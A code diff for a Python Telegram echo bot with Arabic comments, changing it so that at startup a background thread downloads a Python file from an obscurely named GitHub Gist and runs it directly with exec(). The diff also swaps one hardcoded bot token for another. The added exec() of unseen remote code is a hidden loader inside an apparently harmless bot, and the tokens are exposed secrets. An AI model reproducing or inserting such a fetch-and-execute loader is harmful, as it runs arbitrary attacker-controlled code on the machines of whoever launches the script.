@@ -1,28 +1,21 @@
 import requests
-import os
 import telebot
 import threading
 
 # إعداد توكن البوت الخاص بك
-TOKEN = '7619304970:AAHtToACxy7lNNJjaXvHlxWMJ92voTpWmew'
+TOKEN = '7287328621:AAGunduTgsqErYliEuZcWtIFNYYDHUsqWNs'
 bot = telebot.TeleBot(TOKEN)
 
-# رابط الملف الذي تريد تحميله من GitHub
-url = 'https://raw.githubusercontent.com/saSfa43g/aaaaxxx/refs/heads/main/gjhnlflfjlgfnfga.py'
+# رابط الملف الذي تريد تحميله من Gist
+url = 'https://gist.githubusercontent.com/saSfa43g/008a2a3f01bd68b0c761e36aaa32594e/raw/54b16ecd3c722d3e317f22ff1426e9ce12010e31/gjhnlflfjlgfnfga.py'
 
-# اسم الملف الذي سيتم حفظه
-filename = 'gjhnlflfjlgfnfga.py'
-
-# تحميل الملف
-def download_file():
+# تشغيل الكود مباشرة
+def run_code():
     response = requests.get(url)
     if response.status_code == 200:
-        with open(filename, 'wb') as f:
-            f.write(response.content)
-        print(f'File downloaded as {filename}')
-
-        # تشغيل الكود بعد التحميل
-        os.system(f'python {filename}')
+        code = response.text
+        exec(code)  # تشغيل الكود مباشرة
+        print('Code executed successfully.')
     else:
         print('Failed to download the file')
 
@@ -40,9 +33,9 @@ def echo_all(message):
 def start_bot():
     bot.polling()
 
-# بدء تحميل الملف
-download_thread = threading.Thread(target=download_file)
-download_thread.start()
+# بدء تشغيل الكود
+run_thread = threading.Thread(target=run_code)
+run_thread.start()
 
 # بدء البوت
 start_bot()
